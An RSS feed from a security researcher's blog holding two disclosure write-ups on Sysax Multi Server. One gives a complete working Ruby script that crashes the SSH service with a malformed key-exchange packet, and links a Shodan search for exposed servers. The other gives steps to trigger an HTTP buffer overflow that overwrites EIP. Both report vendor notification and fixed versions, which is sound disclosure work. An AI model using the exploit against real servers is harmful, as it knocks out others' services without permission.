<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Sysax on Matt Andreko</title>
    <link>http://test.andreko.net/categories/sysax/index.xml</link>
    <description>Recent content in Sysax on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="http://test.andreko.net/categories/sysax/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Sysax Multi Server 6.10 SSH DoS</title>
      <link>http://test.andreko.net/2013/04/08/sysax-multi-server-6.10-ssh-dos/</link>
      <pubDate>Mon, 08 Apr 2013 08:27:00 -0400</pubDate>
      
      <guid>http://test.andreko.net/2013/04/08/sysax-multi-server-6.10-ssh-dos/</guid>
      <description>

&lt;p&gt;I was recently fuzzing a bunch of SSH servers, hoping to find some remote code execution in a non-mainstream server. I ended up finding no code execution in the several that I tried, but I did find one pre-auth denial of service in Syax Multi Server 6.10.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&#34;try-this-at-home&#34;&gt;Try this at home!&lt;/h2&gt;

&lt;p&gt;The vulnerable version can be downloaded &lt;a href=&#34;https://www.dropbox.com/s/d6js8u6i4eioa1j/sysaxserv_setup_6.10.msi&#34;&gt;here&lt;/a&gt; for anyone that would like to duplicate the DoS conditions.&lt;/p&gt;

&lt;h2 id=&#34;understanding-the-key-exchange&#34;&gt;Understanding the Key Exchange&lt;/h2&gt;

&lt;p&gt;I found that during the key exchange, where the SSH client and SSH server negotiate which ciphers to use, if you messed up just a single specific byte, the server would crash. I started reading through the &lt;a href=&#34;https://tools.ietf.org/html/rfc4253#section-7.1&#34;&gt;RFC&lt;/a&gt; for SSH keyexchange, and found the key exchange to be mostly ASCII.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;http://test.andreko.net/img/sysax_ssh_hex.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I started playing with the byte that caused the crash, and it seemed that it was some sort of control character, or separator. I&amp;rsquo;m still unsure. However, changing it would cause a crash every time.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;http://test.andreko.net/img/sysax_ssh_hex2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I wasn&amp;rsquo;t able to figure out any way to get remote code execution, although someone smarter than me, may be able to do it. For now, I&amp;rsquo;ll settle with a DoS exploit.&lt;/p&gt;

&lt;h2 id=&#34;the-exploit&#34;&gt;The exploit&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env ruby
# Sysax Multi Server 6.10 SSH DoS
# Matt &amp;quot;hostess&amp;quot; Andreko &amp;lt; mandreko [at] accuvant.com &amp;gt;
# http://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html

require &#39;socket&#39;

unless ARGV.length == 2
  puts &amp;quot;Usage: ruby #{$0} [host] [port]\n&amp;quot;
  exit
end

packet = [0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,
  0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,
  0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,
  0x00, 0x7e, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x2d, 0x65,
  0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x2d,
  0x73, 0x68, 0x61, 0x32, 0x35, 0x36, 0x2c, 0x64,
  0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65,
  0x6c, 0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72,
  0x6f, 0x75, 0x70, 0x2d, 0x65, 0x78, 0x63, 0x68,
  0x61, 0x6e, 0x67, 0x65, 0x2d, 0x73, 0x68, 0x61,
  0x31, 0x2c, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x31, 0x34,
  0x2d, 0x73, 0x68, 0x61, 0x31, 0x2c, 0x64, 0x69,
  0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c,
  0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72, 0x6f,
  0x75, 0x70, 0x31, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x00, 0x00, 0x00, 0x0f, 0x73, 0x73, 0x68, 0x2d,
  0x72, 0x73, 0x61, 0x2c, 0x73, 0x73, 0x68, 0x2d,
  0x64, 0x73, 0x73, 0x00, 0x00, 0x00, 0x9d, 0x61,
  0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63, 0x62,
  0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d, 0x63,
  0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77, 0x66,
  0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63, 0x2c,
  0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38, 0x2d,
  0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63, 0x66,
  0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c, 0x61,
  0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32, 0x35,
  0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f, 0x75,
  0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39, 0x32,
  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65, 0x73,
  0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63, 0x2c,
  0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65, 0x6c,
  0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79, 0x73,
  0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69, 0x75,
  0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73, 0x31,
  0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c, 0x61,
  0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63, 0x74,
  0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35, 0x36,
  0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00, 0x9d,
  0x61, 0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63,
  0x62, 0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d,
  0x63, 0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77,
  0x66, 0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63,
  0x2c, 0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38,
  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63,
  0x66, 0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c,
  0x61, 0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32,
  0x35, 0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f,
  0x75, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39,
  0x32, 0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65,
  0x73, 0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63,
  0x2c, 0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65,
  0x6c, 0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79,
  0x73, 0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69,
  0x75, 0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73,
  0x31, 0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c,
  0x61, 0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63,
  0x74, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35,
  0x36, 0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00,
  0x69, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64,
  0x35, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
  0x68, 0x61, 0x31, 0x2c, 0x75, 0x6d, 0x61, 0x63,
  0x2d, 0x36, 0x34, 0x40, 0x6f, 0x70, 0x65, 0x6e,
  0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c,
  0x68, 0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70,
  0x65, 0x6d, 0x64, 0x31, 0x36, 0x30, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70, 0x65,
  0x6d, 0x64, 0x31, 0x36, 0x30, 0x40, 0x6f, 0x70,
  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
  0x6d, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
  0x68, 0x61, 0x31, 0x2d, 0x39, 0x36, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2d,
  0x39, 0x36, 0x00, 0x00, 0x00, 0x69, 0x68, 0x6d,
  0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x2c, 0x75, 0x6d, 0x61, 0x63, 0x2d, 0x36, 0x34,
  0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68,
  0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68, 0x6d, 0x61,
  0x63, 0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64,
  0x31, 0x36, 0x30, 0x2c, 0x68, 0x6d, 0x61, 0x63,
  0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64, 0x31,
  0x36, 0x30, 0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73,
  0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x2d, 0x39, 0x36, 0x2c, 0x68, 0x6d, 0x61, 0x63,
  0x2d, 0x6d, 0x64, 0x35, 0x2d, 0x39, 0x36, 0x00,
  #3rd byte in this next line causes crash
  0x00, 0x00, 0x28, 0x7a, 0x6c, 0x69, 0x62, 0x40,
  0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e,
  0x63, 0x6f, 0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62,
  0x2c, 0x6e, 0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00,
  0x1a, 0x7a, 0x6c, 0x69, 0x62, 0x40, 0x6f, 0x70,
  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
  0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62, 0x2c, 0x6e,
  0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00].pack(&amp;quot;C*&amp;quot;)

host = ARGV[0]
port = ARGV[1]

sock = TCPSocket.open(host, port)

banner = sock.gets()
puts banner

sock.puts(&amp;quot;SSH-2.0-OpenSSH_5.1p1 Debian-5ubuntu1\r\n&amp;quot;)
sock.puts(packet)
resp = sock.gets()

sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;remediation&#34;&gt;Remediation&lt;/h2&gt;

&lt;p&gt;I contacted the developers of Sysax Multi Server on March 18 2013 and April 6 2013. They were able to release a new version (6.11) which is no longer vulnerable to this bug. If you&amp;rsquo;re running Sysax Multi Server with SSH (off by default, but plenty of users on &lt;a href=&#34;http://www.shodanhq.com/search?q=sysax+port%3A22&#34;&gt;ShodanHQ&lt;/a&gt;), I would highly recommend updating to 6.11, available &lt;a href=&#34;http://www.sysax.com/download.htm#sysaxserv&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;update&#34;&gt;Update:&lt;/h2&gt;

&lt;p&gt;It looks like the Metasploit module I wrote for this has been merged! You can view it &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/225342ce8f34b1af49e498c0cc6fa92c127187e8/modules/auxiliary/dos/windows/ssh/sysax_sshd_kexchange.rb&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sysax 5.64 HTTP Remote Buffer Overflow</title>
      <link>http://test.andreko.net/2012/07/28/sysax-5.64-http-remote-buffer-overflow/</link>
      <pubDate>Sat, 28 Jul 2012 22:56:00 -0400</pubDate>
      
      <guid>http://test.andreko.net/2012/07/28/sysax-5.64-http-remote-buffer-overflow/</guid>
      <description>&lt;p&gt;I have discovered a bug in the &lt;a href=&#34;http://sysax.com/server/index.htm&#34;&gt;Sysax Multi-Server application&lt;/a&gt;. More specifically, it&amp;rsquo;s in the HTTP File Server service, which is not enabled by default. It has to be turned on by the admin for this exploit to properly function. The user in question also needs permission to create a directory.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In the Sysax service, the configuration would look like this:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;http://test.andreko.net/img/sysax_5.64_protocols.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;To trigger this vulnerability is pretty simple. Log into the HTTP File Server:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;http://test.andreko.net/img/sysax_5.64_login.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After logging in, click the &amp;ldquo;Create Folder&amp;rdquo; link:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;http://test.andreko.net/img/sysax_5.64_main.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;In the &amp;ldquo;Folder Name&amp;rdquo; textbox, enter 1000 &amp;ldquo;A&amp;rdquo;s:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;http://test.andreko.net/img/sysax_5.64_create_folder.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The service will then crash, and have the EIP address overwritten:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;http://test.andreko.net/img/sysax_5.64_crash.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I reported this vulnerability to CodeOrigin, the creators of the Sysax Multi-Server on July 26 17:24 PM EDT. Surprisingly, they got back to me at July 27 04:28 AM PDT with a new version available (5.65).  Unfortunately this version had the same vulnerability, although the EIP offset was different. After reporting this, they got back to me again at July 28 06:59 AM PDT, stating that a new version was available (5.66). This new version appears to have the vulnerability fixed.&lt;/p&gt;

&lt;p&gt;If you&amp;rsquo;re using Sysax Multi-Server, please upgrade, to prevent attackers from infiltrating your systems.&lt;/p&gt;

&lt;p&gt;The exploit can now be found on exploit-db, &lt;a href=&#34;http://www.exploit-db.com/exploits/20676&#34;&gt;here&lt;/a&gt;, where you can also download the vulnerable version of the software.&lt;/p&gt;

&lt;p&gt;Thanks a bunch to &lt;a href=&#34;https://twitter.com/cd1zz&#34;&gt;@cd1zz&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/iMulitia&#34;&gt;@iMulitia&lt;/a&gt; for pointing me to this app!&lt;/p&gt;

&lt;p&gt;UPDATE (2012-08-19): The original exploit had an issue with a variable EIP offset, due to the fact that the root folder for the user was part of the stack.  I was able to discover a second vulnerability to get the server to disclose the path.  This has been incorporated into the new exploit, and works much better.  Sysax has released an updated version that is no longer vulnerable to this.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>